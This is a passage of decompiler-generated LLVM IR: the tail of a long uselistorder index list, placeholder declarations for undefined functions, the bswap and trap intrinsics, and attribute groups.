522, 523, 324, 410, 355, 1089, 526, 1088, 530, 531, 527, 528, 529, 1090, 532, 1091, 444, 1092, 533, 1093, 534, 70, 124, 202, 203, 204, 547, 1094, 411, 412, 535, 413, 1095, 1096, 544, 325, 1097, 1099, 545, 546, 326, 1098, 359, 1100, 548, 1101, 541, 1102, 1104, 542, 543, 1103, 358, 1105, 1106, 538, 1107, 1109, 539, 540, 1108, 357, 1110, 537, 549, 1111, 1112, 550, 1113, 1115, 551, 552, 1114, 356, 1116, 536, 553, 1117, 1118, 554, 1119, 1120, 555, 1121, 1122, 1123, 556, 1124, 1125, 1126, 1127, 1128, 327, 1393, 1394, 71, 109, 360, 1407, 559, 72, 414, 1408, 1414, 558, 1409, 1410, 1411, 1412, 1413, 361, 1415, 560, 445, 1416, 1417, 557, 1418, 561, 1419, 1420, 205, 563, 378, 73, 376, 377, 1423, 144, 446, 1424, 564, 1425, 562, 1426, 565, 381, 74, 379, 380, 1427, 566, 1428, 1429, 567, 1430, 1431, 415, 569, 570, 568, 571, 974, 975, 583, 976, 977, 978, 979, 582, 980, 981, 982, 983, 581, 984, 985, 986, 987, 578, 579, 572, 580, 577, 362, 988, 574, 989, 575, 576, 939, 1454, 75, 119, 1455, 416, 573, 76, 110, 118, 584, 585, 586, 417, 418, 419, 1697, 447, 1698, 120, 363, 328, 77, 78, 329, 1700, 420, 421, 422, 423, 593, 1701, 1703, 1704, 1705, 588, 1706, 589, 590, 591, 587, 364, 592, 1702, 448, 595, 596, 594, 424, 33, 598, 597, 599, 1708, 425, 426, 427, 428, 1711, 602, 600, 601, 365, 1712, 603, 1713, 449, 382, 1717, 1718, 429, 1714, 1715, 604, 605, 606, 1716, 608, 609, 610, 611, 612, 607, 366, 613, 1719, 614, 79, 620, 80, 619, 615, 1734, 618, 368, 621, 616, 1735, 617, 367, 622, 81, 111, 1736, 430, 625, 626, 1737, 627, 1742, 628, 1741, 630, 631, 629, 1749, 1750, 450, 1751, 1752, 206, 1753, 82, 451, 1755, 369, 632, 633, 634, 635, 1757, 1758, 394, 636, 1767, 1768, 637, 1769, 638, 1770, 1771, 639, 207, 640, 641, 642, 643, 644, 1841, 208, 83, 383, 370, 433, 434, 1831, 1832, 1833, 371, 431, 432, 435, 1834, 1835, 436, 1836, 1837, 373, 84, 209, 210, 372, 1839, 1840, 452, 211, 85, 645, 1838, 1842, 1843, 437, 438, 1000, 439, 440, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 1985, 1986, 1987, 1988, 1989, 1990, 1991, 1992, 1993, 1994, 1995, 1996, 1997, 1998, 1999 }
  uselistorder i32* @r4, {}
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i64 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i16* @__decompiler_undefined_function_5() local_unnamed_addr

declare i8** @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
